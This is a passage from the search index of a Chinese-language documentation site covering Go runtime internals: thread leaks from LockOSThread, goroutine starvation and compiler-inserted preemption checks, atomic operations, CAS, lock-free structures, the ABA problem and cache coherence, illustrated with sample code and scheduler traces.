<p>\u8fd9\u5c31\u53ef\u80fd\u5bfc\u81f4\u4e00\u4e2a\u95ee\u9898\uff0c\u521b\u5efa\u51fa\u5927\u91cf\u7684\u7a7a\u95f2\u7684M\uff0c\u4e0d\u4f1a\u88ab\u56de\u6536\u3002M\u662f\u4f1a\u5728\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4e2d\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u5c3d\u7ba1\u8fd9\u79cd\u4f11\u7720\u72b6\u6001\u4e0b\u7684M\u4e0d\u4f1a\u88abCPU\u5206\u914d\u65f6\u95f4\u7247\uff0c\u4f46\u4ecd\u7136\u4f1a\u5360\u7528\u7ba1\u7406\u8d44\u6e90\uff0c\u53e6\u5916\u6bcf\u4e2aM\u4e0a\u90fd\u5e26\u7740G0\u5185\u5b58\uff0c\u76f8\u5f53\u4e8e\u8d44\u6e90\u6cc4\u6f0f\u4e86\u3002\u6211\u4eec\u901a\u8fc7\u5982\u4e0b\u4ee3\u7801\u6765\u6a21\u62df\u8fd9\u79cd\u60c5\u51b5\uff1a</p> <pre><code>func main(){\n    for i :=0;i&lt;1000;i++{\n        go func(){\n            runtime.LockOSThread() //\u901a\u8fc7\u9501\u6a21\u62df\u7cfb\u7edf\u8c03\u7528\n            defer runtime.UnlockOSThread()\n            time.Sleep(time.Second*5)\n        }()\n    }\n    time.Sleep(time.Minute)\n}\n</code></pre> <p>\u901a\u8fc7<code>go build test.go &amp;&amp; GODEBUG=schedtrace=1000 ./test</code>\u8fd0\u884c\uff1a</p> <pre><code>SCHED 0ms: gomaxprocs=4 idleprocs=2 threads=5 spinningthreads=1 idlethreads=2 runqueue=0 [0 0 0 0]\nSCHED 1002ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 2008ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 3013ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 4014ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 5015ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=127 runqueue=0 [0 0 0 0]\nSCHED 6017ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=1007 runqueue=0 [0 0 0 0]\nSCHED 7025ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=1007 runqueue=0 [0 0 0 0]\nSCHED 8027ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=1007 runqueue=0 [0 0 0 0]\nSCHED 9029ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=1007 runqueue=0 [0 0 0 0]\nSCHED 10031ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=1007 runqueue=0 [0 0 0 0]\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u4efb\u52a1\u5f00\u59cb\u7684\u65f6\u5019\u5171\u521b\u5efa\u4e861010\u4e2a\u7ebf\u7a0b\uff0c\u4efb\u52a1\u6267\u884c\u5b8c\u4ee5\u540e\uff0c\u4ecd\u7136\u67091007\u4e2a\u4f11\u7720\u7684\u7ebf\u7a0b\u3002\u5f53\u6211\u4eec\u628a<code>runtime.LockOSThread()</code>\u6ce8\u91ca\u6389\uff0c\u91cd\u65b0\u8fd0\u884c\uff1a</p> <pre><code>SCHED 0ms: gomaxprocs=4 idleprocs=1 threads=5 spinningthreads=1 idlethreads=1 runqueue=0 [48 49 133 0]\nSCHED 1004ms: gomaxprocs=4 idleprocs=4 threads=9 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 2008ms: gomaxprocs=4 idleprocs=4 threads=9 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 3010ms: gomaxprocs=4 idleprocs=4 threads=9 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 4015ms: gomaxprocs=4 idleprocs=4 threads=9 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 5026ms: gomaxprocs=4 idleprocs=4 threads=9 spinningthreads=0 idlethreads=7 runqueue=0 [0 0 0 0]\nSCHED 6031ms: gomaxprocs=4 idleprocs=4 threads=9 spinningthreads=0 idlethreads=7 runqueue=0 [0 0 0 0]\n</code></pre> <p>\u53d1\u73b0\u6ca1\u6709\u7cfb\u7edf\u8c03\u7528\uff0c\u90a3\u5c31\u6839\u672c\u4e0d\u4f1a\u6709\u90a3\u4e48\u591a\u7ebf\u7a0b\u3002\u6211\u4eec\u518d\u628a<code>runtime.LockOSThread()</code>\u4fdd\u7559\uff0c<code>defer runtime.UnlockOSThread()</code>\u53bb\u6389\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>SCHED 0ms: gomaxprocs=4 idleprocs=2 threads=5 spinningthreads=1 idlethreads=2 runqueue=0 [0 0 152 0]\nSCHED 1000ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 2001ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 3008ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 4016ms: gomaxprocs=4 idleprocs=4 threads=1010 spinningthreads=0 idlethreads=4 runqueue=0 [0 0 0 0]\nSCHED 5019ms: gomaxprocs=4 idleprocs=0 threads=938 spinningthreads=0 idlethreads=4 runqueue=0 [18 1 3 7]\nSCHED 6027ms: gomaxprocs=4 idleprocs=4 threads=13 spinningthreads=0 idlethreads=10 runqueue=0 [0 0 0 0]\nSCHED 7037ms: gomaxprocs=4 idleprocs=4 threads=13 spinningthreads=0 idlethreads=10 runqueue=0 [0 0 0 0]\nSCHED 8042ms: gomaxprocs=4 idleprocs=4 threads=13 spinningthreads=0 idlethreads=10 runqueue=0 [0 0 0 0]\nSCHED 9044ms: gomaxprocs=4 idleprocs=4 threads=13 spinningthreads=0 idlethreads=10 runqueue=0 [0 0 0 0]\ncSCHED 10047ms: gomaxprocs=4 idleprocs=4 threads=13 spinningthreads=0 idlethreads=10 runqueue=0 [0 0 0 0]\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u90a3\u4e9b\u521b\u5efa\u7684\u7ebf\u7a0b\u662f\u4f1a\u88ab\u56de\u6536\u7684\uff0c\u7ebf\u7a0b\u6ca1\u6709\u88ab\u89e3\u9501\u610f\u5473\u7740\u7ebf\u7a0b\u7684\u72b6\u6001\u6ca1\u6709\u88ab\u89e3\u9664\u800c\u9677\u5165\u4e86\u6b7b\u9501\u72b6\u6001\uff0c\u7ebf\u7a0b\u4e0d\u80fd\u518d\u53bb\u63a5\u6536\u65b0\u7684\u4efb\u52a1\u6ca1\u6709\u5b58\u5728\u7684\u610f\u4e49\u81ea\u7136\u4f1a\u88ab\u6740\u6389\u3002</p> <p>\u7efc\u4e0a\uff0c\u6211\u4eec\u53d1\u73b0P\u5f80\u5f80\u662f\u6052\u5b9a\u7684\uff0c\u800cG\u548cM\u662f\u53ef\u590d\u7528\u7684\uff0c\u590d\u7528\u867d\u7136\u53ef\u80fd\u9020\u6210\u8d44\u6e90\u7684\u6d6a\u8d39\uff0c\u4f46\u5b83\u907f\u514d\u4e86\u91cd\u65b0\u521b\u5efa\u65f6\u7684\u53ef\u80fd\u9020\u6210\u7684\u7ade\u4e89\u6548\u5e94\u3002\u5bf9\u4e8e\u4e00\u4e9b\u957f\u671f\u8fd0\u884c\u7684\u4e1c\u897f\uff0c\u6211\u4eec\u9700\u8981\u518d\u521b\u5efa\u8fd8\u662f\u91ca\u653e\u4e4b\u95f4\u505a\u4e00\u4e9b\u6743\u8861\u3002</p>"},{"location":"go/goroutine/#_9","title":"\u4efb\u52a1\u997f\u6b7b","text":"<p>\u5047\u8bbe\u5f53\u524d\u7684P/M\u6b63\u5728\u6267\u884c\u4e00\u4e2aG\uff0c\u8fd9\u65f6\u5019G\u91cc\u9762\u521b\u5efa\u4e86\u4e00\u4e2aG1\uff0cG1\u4f1a\u88ab\u653e\u5230\u5f53\u524dP\u7684runnext\u4e2d\uff0c\u4f46\u5b83\u53ef\u80fd\u8fdf\u8fdf\u5f97\u4e0d\u5230\u6267\u884c\u88ab\u997f\u6b7b\uff0c\u56e0\u4e3aG\u4e2d\u53ef\u80fd\u8fd8\u6709\u5927\u91cf\u7684\u903b\u8f91\u4ee3\u7801\u6267\u884c\u5b8c\u624d\u8f6e\u5230runnext\uff0c\u8fd9\u663e\u7136\u662f\u4e0d\u5408\u7406\u7684\u3002\u600e\u4e48\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u662f\u5426\u53ef\u4ee5\u8ba9\u5f53\u524d\u8fd9\u4e2aP/M\u4ea4\u66ff\u7684\u6267\u884cG\u548cG1\uff1fP\u4e0d\u662f\u771f\u6b63\u7684CPU\uff0c\u6ca1\u6cd5\u5b9e\u73b0\u57fa\u4e8e\u65f6\u95f4\u7247\u7684\u62a2\u5360\u5f0f\u8c03\u5ea6\uff0c\u53ea\u80fd\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u534f\u7a0b\u90a3\u6837\u7684\u534f\u4f5c\u5f0f\u8c03\u5ea6\u3002\u5f88\u591a\u8bed\u8a00\u91cc\u90fd\u4f7f\u7528\u7c7b\u4f3c\u4e8eGosched()\u8fd9\u6837\u7684\u51fd\u6570\u6765\u4e3b\u52a8\u4ea4\u51fa\u6267\u884c\u6743\uff0c\u4f46Go\u4e2d\u5374\u5f88\u5c11\u89c1\uff1b\u8fd8\u6709\u4e00\u79cd\u5f62\u5f0f\u662fruntime\u5e26\u4e00\u4e2a\u8ba1\u6570\u5668\uff0c\u6bcf\u6267\u884c\u4e00\u4e2a\u4efb\u52a1\u540e\u7d2f\u52a0\u8ba1\u6570\uff0c\u5f53\u5230\u8fbe\u4e00\u4e2a\u6307\u5b9a\u7684\u8ba1\u6570\u5c31\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4f7f\u7528\u5b8c\u4e86\u65f6\u95f4\u7247\uff0c\u5411\u5f53\u524d\u6267\u884c\u7684P/M\u53d1\u51fa\u4e00\u4e2a\u62a2\u5360\u5f0f\u7684\u4fe1\u53f7\uff0c\u7136\u540eG\u4e3b\u52a8\u8ba9\u51fa\u6267\u884c\u6743\u9650\u3002Go\u5230\u5e95\u662f\u600e\u6837\u505a\u7684\uff1f\u6211\u4eec\u6765\u770b\u5982\u4e0b\u793a\u4f8b\uff1a</p> <pre><code>// GODEBUG=schedtrace=1000,scheddetail=1 ./test  \u53ef\u67e5\u770b\u8fd0\u884c\u671fGMP\u72b6\u6001\nfunc main(){\n    runtime.GOMAXPROCS(1)\n    for i:=0;i&lt;3;i++{\n        go func(id int){\n            println(id)\n            x := 0\n            for{  // \u6b7b\u5faa\u73af\n                x++\n                //print()\n            }\n        }(i)\n    }\n    time.Sleep(time.Second)\n}\n</code></pre> <p>\u6211\u4eec\u6a21\u62df\u4e86\u53ea\u6709\u4e00\u4e2aP/M\uff0c\u8fd9\u65f6\u5019\u521b\u5efa\u4e863\u4e2aG\uff0c\u8ba9\u7b2c\u4e00\u4e2aG\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u5165\u6b7b\u5faa\u73af\uff0c\u8fd0\u884c\u7ed3\u679c\u5c31\u662f\u53ea\u6253\u5370\u51fa\u4e86\u4efb\u52a10\uff0c\u5176\u4ed6G\u88ab\u997f\u6b7b\u4e86\u3002\u4f46\u5f53\u6211\u4eec\u5728\u6b7b\u5faa\u73af\u5185x++\u540e\u9762\u52a0\u5165\u4e00\u4e2a\u51fd\u6570\uff0c\u5219\u4efb\u52a10\u30011\u30012\u90fd\u4f1a\u88ab\u6253\u5370\u51fa\u3002\u95ee\u9898\u5c31\u51fa\u5728\u8fd9\u4e2a\u51fd\u6570\u4e0a\u3002</p> <p>\u6211\u4eec\u5148\u4f7f\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u51fd\u6570\u6765\u89c2\u5bdf\uff1a</p> <pre><code>//go:noinline\nfunc test(){\n    println()\n}\n\nfunc main(){\n    test()\n}\n</code></pre> <p>\u4f7f\u7528<code>go build &amp;&amp; go tool objdump -s \"main\\.test\" test</code>\u53cd\u6c47\u7f16\uff1a</p> <pre><code>TEXT main.test(SB) /mnt/hgfs/disk/test.go\n  test.go:5     0x4525b0        64488b0c25f8ffffff  MOVQ FS:0xfffffff8, CX          \n  test.go:5     0x4525b9        483b6110        CMPQ 0x10(CX), SP           \n  test.go:5     0x4525bd        7624            JBE 0x4525e3                \n  test.go:5     0x4525bf        4883ec08        SUBQ $0x8, SP               \n  test.go:5     0x4525c3        48892c24        MOVQ BP, 0(SP)              \n  test.go:5     0x4525c7        488d2c24        LEAQ 0(SP), BP              \n  test.go:6     0x4525cb        e80031fdff      CALL runtime.printlock(SB)      \n  test.go:6     0x4525d0        e88b33fdff      CALL runtime.printnl(SB)        \n  test.go:6     0x4525d5        e87631fdff      CALL runtime.printunlock(SB)        \n  test.go:7     0x4525da        488b2c24        MOVQ 0(SP), BP              \n  test.go:7     0x4525de        4883c408        ADDQ $0x8, SP               \n  test.go:7     0x4525e2        c3          RET                 \n  test.go:5     0x4525e3        e8187bffff      CALL runtime.morestack_noctxt(SB)   \n  test.go:5     0x4525e8        ebc6            JMP main.test(SB)   \n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u5934\u90e8\u7684\u4e09\u6761\u6307\u4ee4\u548c\u5c3e\u90e8\u7684\u4e24\u6761\u6307\u4ee4\u90fd\u662f\u7f16\u8bd1\u5668\u63d2\u5165\u7684\u3002<code>runtime.morestack_noctxt</code>\u4f1a\u505a\u4e24\u4ef6\u4e8b\u60c5\uff0c\u4e00\u662f\u68c0\u67e5\u5f53\u524d\u6808\u5e27\u7a7a\u95f4\u662f\u5426\u8db3\u591f\uff0c\u5982\u679c\u4e0d\u591f\u53ef\u4ee5\u5e2e\u52a9\u6269\u5bb9\uff1b\u4e8c\u662f\u68c0\u67e5\u662f\u5426\u6709\u4eba\u53d1\u51fa\u4e86\u62a2\u5360\u5f0f\u8c03\u5ea6\u4fe1\u53f7\uff0c\u5982\u679c\u53d1\u73b0\u4e86\u4fe1\u53f7\uff0c\u5b83\u5c31\u8ba9\u51fa\u6267\u884c\u6743\u9650\u3002\u51fd\u6570\u524d\u4f7f\u7528<code>go:nosplit</code>\u53ef\u4ee5\u7981\u6b62\u7f16\u8bd1\u5668\u63d2\u5165\u8fd9\u6837\u7684\u6307\u4ee4\u3002</p>"},{"location":"go/lock/","title":"\u9501\u7684\u539f\u7406","text":"<p>\u9501\u662f\u600e\u4e48\u5b9e\u73b0\u7684\uff1f\u600e\u4e48\u505a\u5230\u72ec\u5360\u7684\uff1f\u5b9e\u9645\u4e0a\u5f97\u4ece\u539f\u5b50\u64cd\u4f5c\u8bf4\u8d77\u3002</p>"},{"location":"go/lock/#_2","title":"\u539f\u5b50\u64cd\u4f5c","text":"<p>\u539f\u5b50\u64cd\u4f5c\u4e0d\u662f\u8bf4\u4e00\u5b9a\u8981\u53ea\u80fd\u4e00\u4e2a\u52a8\u4f5c\uff0c\u800c\u662f\u8bf4\u628a\u5b83\u5305\u88c5\u6210\u4e00\u6761\u6307\u4ee4\u6216\u8005\u4e00\u4e2a\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5b83\u53ef\u4ee5\u4fdd\u8bc1\u4e0d\u4f1a\u88ab\u4fb5\u5165\u3002\u5728\u5355\u6838CPU\u4e0a\uff0c\u4e00\u6761\u6307\u4ee4\u80af\u5b9a\u662f\u539f\u5b50\u7684\uff0c\u4f46\u4e0d\u89c1\u5f97\u4e00\u6761\u6307\u4ee4\u5c31\u53ea\u505a\u4e86\u4e00\u4e2a\u64cd\u4f5c\uff0c\u53ef\u80fd\u662f\u4e24\u4e2a\u64cd\u4f5c\uff0c\u6bd4\u5982<code>CAS</code>(Compare&amp;Set\u6216Compare&amp;Swap\uff0cX86\u4e0b\u5bf9\u5e94\u7684\u662fCMPXCHG\u6c47\u7f16\u6307\u4ee4)\u662f\u6bd4\u8f83\u5e76\u4ea4\u6362\u64cd\u4f5c\u6570\uff0c\u8fd9\u5728\u5355\u6838\u4e0a\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u5728\u591a\u6838\u4e0a\u5982\u4f55\u4fdd\u8bc1\u4e0d\u88ab\u6253\u65ad\u5462\uff1f\u8fd9\u5c31\u9700\u8981\u786c\u4ef6\u6765\u652f\u6301\u4e86\u3002</p> <p>\u6211\u4eec\u5728intel IA-64\u624b\u518c\u4e2d\uff0c\u53ef\u4ee5\u7ffb\u5230\u8fd9\u6837\u4e00\u6761\u6307\u4ee4\u524d\u7f00: </p> <p>\u6309\u6587\u6863\u63cf\u8ff0\uff0c\u628a\u8fd9\u6761\u524d\u7f00\u52a0\u5230\u67d0\u4e9b\u6307\u4ee4\u524d\u65f6\uff0c\u5b83\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u539f\u5b50\u64cd\u4f5c\u3002\u5728x86\u4f53\u7cfb\u4e2d\uff0cCPU\u91cc\u4e13\u95e8\u6709\u4e00\u6761\u5f15\u7ebf\u53ebHLOCK pin\uff0c\u5f53\u9047\u5230\u6709LOCK\u524d\u7f00\u7684\u6307\u4ee4\u5c31\u62c9\u4f4e\u8be5\u5f15\u7ebf\u7535\u4f4d\uff0c\u4ece\u800c\u9501\u4f4f\u4e86\u603b\u7ebf\u3002\u90a3\u4e48\u5728\u540c\u4e00\u603b\u7ebf\u4e0a\u7684\u5176\u4ed6Core\u5c31\u65e0\u6cd5\u901a\u8fc7\u603b\u7ebf\u8bbf\u95ee\u5185\u5b58\u4e86\u3002\u6240\u4ee5\u539f\u5b50\u64cd\u4f5c\u7684\u672c\u8d28\u4ecd\u7136\u662f\u9501\uff0c\u53ea\u662f\u8fd9\u4e2a\u9501\u662f\u786c\u4ef6\u5c42\u9762\u7684\u3002\u4e5f\u4e0d\u5b58\u5728\u8f6f\u4ef6\u5c42\u9762\u4e0a\u771f\u6b63\u610f\u4e49\u7684\u65e0\u9501\u64cd\u4f5c\uff0c\u5e95\u5c42\u4ecd\u7136\u662f\u9501\u3002</p> <p>\u6211\u4eec\u5728Go\u7684\u6e90\u7801\u4e2d\u4e5f\u80fd\u770b\u5230\u5927\u91cf\u8fd9\u6837\u7684\u4ee3\u7801:</p> <pre><code>// src/runtime/internal/atomic/asm_amd64.s\nTEXT runtime\u2215internal\u2215atomic\u00b7Cas(SB),NOSPLIT,$0-17\n    MOVQ    ptr+0(FP), BX\n    MOVL    old+8(FP), AX\n    MOVL    new+12(FP), CX\n    LOCK\n    CMPXCHGL    CX, 0(BX)\n    SETEQ   ret+16(FP)\n    RET\n</code></pre> <p>\u968f\u7740\u73b0\u5728CPU\u6838\u6570\u9010\u6b65\u589e\u591a\uff0c\u8fd9\u79cdLOCK\u524d\u7f00\u9501\u603b\u7ebf\u7684\u65b9\u5f0f\u5e26\u6765\u7684\u6027\u80fd\u95ee\u9898\u5c31\u51f8\u663e\u4e86\u51fa\u6765\uff0c\u6240\u4ee5\u73b0\u5728\u7684\u4f53\u7cfb\u9047\u5230LOCK\u524d\u7f00\u65f6\uff0c\u4e0d\u662f\u53bb\u9501\u6574\u4e2a\u603b\u7ebf\uff0c\u800c\u662f\u5148\u68c0\u67e5\u4e00\u4e0b\u8981\u9501\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u5728cache\u4e2d\uff0c\u5982\u679c\u5728\u7684\u8bdd\u53ea\u9501\u90a3\u4e00\u884ccacheline\uff0c\u53ea\u6709\u540c\u65f6\u8bbf\u95ee\u8fd9\u4e00\u4e2acacheline\u7684\u5176\u4ed6core\u624d\u4f1a\u88ab\u9501\u4f4f\uff0c\u5c31\u50cf\u6570\u636e\u5e93\u7684\u8868\u9501\u548c\u884c\u9501\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u6027\u80fd\u7684\u5f71\u54cd\u6ca1\u90a3\u4e48\u5927\u4e86\uff0c\u4f46\u662f\u539f\u5b50\u64cd\u4f5c\u8fd8\u662f\u4f1a\u5e26\u6765\u6027\u80fd\u5f71\u54cd\u7684\uff0c\u53ea\u662f\u786c\u4ef6\u5c42\u9762\u7684\u4e1c\u897f\u6211\u4eec\u4f5c\u4e3a\u7a0b\u5e8f\u5458\u6539\u53d8\u4e0d\u4e86\u4ec0\u4e48\u4e5f\u5c31\u5f88\u5c11\u53bb\u63d0\u3002</p> <p>\u90a3\u4e48\u539f\u5b50\u64cd\u4f5c\u548c\u6211\u4eec\u5e73\u65f6\u6240\u8bf4\u7684\u4e92\u65a5\u9501\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f\u6211\u4eec\u8c08\u539f\u5b50\u64cd\u4f5c\u662f\u53ea\u9488\u5bf9\u4e00\u4e2a\u64cd\u4f5c\uff0c\u800c\u9501\u662f\u5f80\u5f80\u662f\u8981\u5305\u542b\u4e00\u6bb5\u903b\u8f91\u3001\u4e00\u4e2ablock\u7684\u3002</p>"},{"location":"go/lock/#_3","title":"\u65e0\u9501\u7ed3\u6784","text":"<p>\u4e5f\u5c31\u662fLock Free\uff0c\u5b83\u7684\u505a\u6cd5\u7528\u4f2a\u7801\u6765\u8868\u8fbe\u662f\u8fd9\u6837\u7684: <pre><code>for {\n    old = atomic.Load()\n\n    if (atomic.CAS(old, new)){\n        break\n    }\n}\n\n// CAS \u4f2a\u7801\nfunc compareAndSwap(addr int, old int, new int) bool{\n    if (*addr != old){\n        return False\n    }\n    *addr = new\n    return True\n}\n</code></pre></p> <p>\u5f53old\u901a\u8fc7\u539f\u5b50\u64cd\u4f5c\u8bfb\u51fa\u4ee5\u540e\uff0c\u5982\u679c\u6709\u5176\u4ed6CPU\u64cd\u4f5c\u4fee\u6539\u4e86\u8fd9\u4e2a\u503c\uff0c\u90a3\u4e48<code>atomic.CAS</code>\u5c31\u4f1a\u53d1\u73b0old\u53d8\u4e86\u5219\u4fee\u6539\u5931\u8d25\u91cd\u65b0\u5faa\u73af\uff0c\u53cd\u4e4b\u4fee\u6539\u6210\u529f\u9000\u51fa\u5faa\u73af\uff0c\u8fd9\u5c31\u662f\u65e0\u9501\u7ed3\u6784\u3002\u8fd0\u6c14\u597d\u7684\u8bdd\u4e00\u6b21\u5c31\u6267\u884c\u5b8c\u4e86\uff0c\u8fd0\u6c14\u4e0d\u597d\u4e00\u76f4\u88ab\u6253\u65ad\u7684\u8bdd\u5faa\u73af\u591a\u5c11\u6b21\u662f\u672a\u77e5\u7684\u3002\u5b83\u7684\u5b9e\u9645\u4f7f\u7528\u573a\u666f\u6bd4\u5982\u8bf4\u662f\u4e00\u4e2a\u65e0\u9501\u7ed3\u6784\u7684\u94fe\u8868\u961f\u5217\uff0c\u5f53\u9700\u8981\u5411\u961f\u5217\u5c3e\u90e8\u63d2\u5165\u5143\u7d20\u65f6\uff0c\u63d2\u5165\u4e0d\u6210\u529f\u5219\u8bf4\u660e\u6709\u5176\u4ed6\u7ebf\u7a0b\u521a\u521a\u63d2\u5165\u8fc7\uff0c\u961f\u5217\u5c3e\u90e8\u7684\u5730\u5740\u5df2\u7ecf\u53d8\u4e86\uff0c\u5219\u9700\u91cd\u8bd5\u3002</p> <p>\u8fd9\u79cd\u7ed3\u6784\u4e5f\u6709\u4e2a\u95ee\u9898\uff0c\u5c31\u662fABA\u7684\u95ee\u9898\u3002\u8bd5\u60f3\u4e00\u4e0b<code>atomic.Load</code>\u8bfb\u51fa\u6765\u662fA\uff0c\u7136\u540e\u88ab\u4eba\u4fee\u6539\u4e3a\u4e86B\u518d\u4fee\u6539\u56deA\uff0c<code>atomic.CAS</code>\u5c31\u53d1\u73b0\u4e0d\u4e86\u63a5\u7740\u6267\u884c\u81ea\u5df1\u7684\u903b\u8f91\u3002\u8fd9\u6837\u7c97\u770b\u597d\u50cf\u4e5f\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u4f46CAS\u53ea\u662f\u68c0\u67e5\u7684\u4e00\u4e2a\u5730\u5740\uff0c\u5b9e\u9645\u60c5\u51b5\u5f80\u5f80\u4f1a\u6709\u5176\u4ed6\u7684\u903b\u8f91\uff0c\u6709\u4eba\u505a\u4e86\u4e00\u4e2a\u6bd4\u55bb:\u4f60\u62ff\u7740\u4e00\u4e2a\u88c5\u6ee1\u94b1\u7684\u624b\u63d0\u7bb1\u5728\u98de\u673a\u573a\uff0c\u6b64\u65f6\u8fc7\u6765\u4e86\u4e00\u4e2a\u706b\u8fa3\u6027\u611f\u7684\u7f8e\u5973\uff0c\u7136\u540e\u5979\u5f88\u6696\u6627\u5730\u6311\u9017\u7740\u4f60\uff0c\u5e76\u8d81\u4f60\u4e0d\u6ce8\u610f\u7684\u65f6\u5019\uff0c\u628a\u7528\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u624b\u63d0\u7bb1\u548c\u4f60\u90a3\u88c5\u6ee1\u94b1\u7684\u7bb1\u5b50\u8c03\u4e86\u4e2a\u5305\uff0c\u7136\u540e\u5c31\u79bb\u5f00\u4e86\uff0c\u4f60\u770b\u5230\u4f60\u7684\u624b\u63d0\u7bb1\u8fd8\u5728\u90a3\uff0c\u4e8e\u662f\u5c31\u63d0\u7740\u624b\u63d0\u7bb1\u53bb\u8d76\u98de\u673a\u53bb\u4e86\u3002</p> <p>\u600e\u4e48\u89e3\u51b3ABA\u7684\u95ee\u9898\u5462\uff1f\u53ef\u4ee5\u91c7\u7528\u6570\u636e\u5e93\u4e50\u89c2\u9501\u7684\u529e\u6cd5\uff0c\u6bcf\u6b21\u8fdb\u884c\u4fee\u6539\u7684\u65f6\u5019\u6dfb\u52a0\u4e00\u4e2a\u65f6\u95f4\u6233\u6216\u8005\u6d41\u6c34\u53f7\uff0c\u4e0a\u4f8b\u5c31\u662f<code>atomic.Load</code>\u8bfb\u51fa\u6765\u4ee5\u540e\u5c31\u662fA20191222\uff0c\u4fee\u6539\u4e3aB\u5c31\u53d8\u4e3a\u4e86B20191223\uff0c\u518d\u8fdb\u884c\u4e00\u6b21\u4fee\u6539\u5c31\u662fA20191224\u4e86\u3002</p>"},{"location":"go/lock/#_4","title":"\u7f13\u5b58\u4e00\u81f4\u6027","text":"<p>CPU\u662f\u4e0d\u4f1a\u548c\u5185\u5b58\u76f4\u63a5\u4ea4\u4e92\u7684\uff0c\u5b83\u548c\u5185\u5b58\u4e4b\u95f4\u7684\u8bfb\u5199\u90fd\u662f\u901a\u8fc7L1\u3001L2\u3001L3\u7f13\u5b58\u6765\u505a\u4e2d\u8f6c\u3002\u90a3\u4e48\u5982\u679c\u5185\u5b58\u4e0a\u6709\u4e2aX=1\uff0cCPU1\u548cCPU2\u90fd\u628a\u8fd9\u4e2aX\u8bfb\u5230\u81ea\u5df1\u7684\u7f13\u5b58\u4e0a\uff0cCPU1\u8fd9\u65f6\u5019\u5bf9X\u505a\u4e86\u4fee\u6539\u8ba9X=3\uff0cCPU2\u53c8\u5982\u4f55\u77e5\u9053\u5462\uff1f\u8fd9\u5c31\u662f\u7f13\u5b58\u4e00\u81f4\u6027\u7684\u95ee\u9898\uff0c\u9700\u8981\u786e\u4fdd\u7684\u662f\u4efb\u4e00\u65f6\u523b\uff0c\u7f13\u5b58\u7684\u5185\u5bb9\u662f\u76f8\u540c\u7684\u3002</p> <p>\u7f13\u5b58\u662f\u4ee5\u884c\u4e3a\u5355\u4f4d\u7684\uff0c\u4e5f\u5c31\u662fcacheline\uff0c\u6bcf\u884c\u4e2d\u9664\u4e86\u7f13\u5b58\u7684\u6570\u636e\u5916\u8fd8\u5305\u62ec\u5185\u5b58\u5730\u5740\u548c\u72b6\u6001\u3002\u800c\u72b6\u6001\u53c8\u5206\u4e3a\u56db\u79cd\uff0c\u5373M\u3001E\u3001S\u3001I\u3002M\u5373modify\uff0c\u8868\u793a\u5f53\u524dCPU\u4fee\u6539\u8fc7\u6570\u636e\uff0c\u9700\u8981\u4ee5\u6b64\u4e3a\u51c6\u56de\u5199\u5230\u4e3b\u5b58\u4e2d\u53bb\uff1bE\u5373exclusive\uff0c\u72ec\u5360\uff0c\u5f53\u524d\u7684CPU\u72ec\u5360\u4e86\u8fd9\u4e2a\u6570\u636e\uff0c\u548c\u4e3b\u5b58\u4e2d\u662f\u4e00\u81f4\u7684\uff0c\u5176\u4ed6CPU\u6ca1\u6709\u7684\uff1bS\u5373shared\uff0c\u5171\u4eab\uff0c\u5404\u4e2aCPU\u90fd\u6709\u8fd9\u884c\u6570\u636e\uff0c\u4e14\u662f\u548c\u4e3b\u5b58\u4e00\u81f4\u7684\uff1bI\u5373invalid\uff0c\u8868\u793a\u5931\u6548\u7684\uff0cCPU\u53d1\u73b0\u662f\u8fd9\u4e2a\u72b6\u6001\u5c31\u610f\u5473\u7740\u9700\u8981\u4ece\u4e3b\u5b58\u91cc\u91cd\u65b0\u53bb\u62ff\u4e00\u4e0b\u3002</p> <p>\u5f53CPU2\u8981\u53bb\u5199\u67d0\u4e00\u884c\u6570\u636e\u7684\u65f6\u5019\uff0c\u5b83\u5c31\u4f1a\u5411\u603b\u7ebf\u53d1\u51fa\u4e00\u4e2a\u8bf7\u6c42: 